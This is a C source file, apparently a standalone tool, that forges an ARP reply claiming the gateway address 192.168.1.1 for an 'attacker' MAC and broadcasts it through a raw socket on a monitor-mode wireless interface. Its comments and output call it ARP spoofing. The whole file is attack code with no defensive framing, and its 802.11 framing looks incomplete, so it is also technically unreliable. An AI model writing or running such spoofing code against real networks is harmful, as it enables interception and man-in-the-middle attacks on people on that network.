#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <linux/if_ether.h>

#define ARP_REQUEST 1
#define ARP_REPLY 2

struct wlan_packet {
    unsigned char frame_control[2];  // Frame control bytes
    unsigned char duration[2];       // Duration
    unsigned char addr1[6];          // Receiver address (Target MAC)
    unsigned char addr2[6];          // Transmitter address (Attacker MAC)
    unsigned char addr3[6];          // BSSID (Access Point MAC)
    unsigned short seq_control;      // Sequence control
    unsigned char payload[512];      // ARP payload
};

void print_error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

int main() {
    int sockfd;
    struct sockaddr_ll socket_address;
    struct wlan_packet packet;

    // Open raw socket
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        print_error("Socket creation failed");
    }

    // Fill WLAN header
    memset(&packet, 0, sizeof(packet));
    memcpy(packet.addr1, "\xff\xff\xff\xff\xff\xff", 6); // Broadcast
    memcpy(packet.addr2, "\xAA\xBB\xCC\xDD\xEE\xFF", 6); // Attacker MAC
    memcpy(packet.addr3, "\xAA\xAA\xAA\xAA\xAA\xAA", 6); // AP MAC
    packet.seq_control = 0;

    // Fill ARP payload
    struct ether_arp *arp = (struct ether_arp *)packet.payload;
    memset(arp, 0, sizeof(struct ether_arp));
    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETH_P_IP);
    arp->arp_hln = 6;
    arp->arp_pln = 4;
    arp->arp_op = htons(ARP_REPLY);
    memcpy(arp->arp_sha, "\xAA\xBB\xCC\xDD\xEE\xFF", 6); // Attacker MAC
    inet_pton(AF_INET, "192.168.1.1", arp->arp_spa);      // Gateway IP
    memcpy(arp->arp_tha, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);  // Target MAC
    inet_pton(AF_INET, "192.168.1.2", arp->arp_tpa);      // Target IP

    // Send packet
    socket_address.sll_ifindex = if_nametoindex("wlan0mon");
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, "\xff\xff\xff\xff\xff\xff", 6);

    if (sendto(sockfd, &packet, sizeof(packet), 0,
               (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
        print_error("Send failed");
    }

    printf("ARP spoofing packet sent over WLAN.\n");
    close(sockfd);

    return 0;
}
